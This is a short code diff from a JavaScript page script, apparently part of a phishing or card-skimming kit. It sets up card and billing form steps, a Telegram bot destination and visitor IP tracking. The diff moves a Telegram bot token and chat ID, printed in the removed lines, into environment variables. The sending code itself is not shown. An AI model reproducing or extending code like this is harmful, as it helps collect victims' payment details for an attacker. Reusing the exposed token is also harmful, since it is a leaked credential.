@@ -11,10 +11,11 @@ document.addEventListener('DOMContentLoaded', function() {
   // --- New Selectors for Card & Billing ---
   const cardNext = document.querySelector('#cnext'); 
   const billingNext = document.querySelector('#bnext'); 
+  
 
   // Telegram Bot Info
-  const bottoken = '8868352237:AAFRqZveJ3ytmp6F3zdPLwbMcI_ivcQiL_s';
-  const chatid = '5342731960';
+  const bottoken = window.ENV.bottoken;
+  const chatid = window.ENV.chatid;
 
   /// --- Visitor Data Logic (FIXED with Fallback) ---
 let userIP = "";
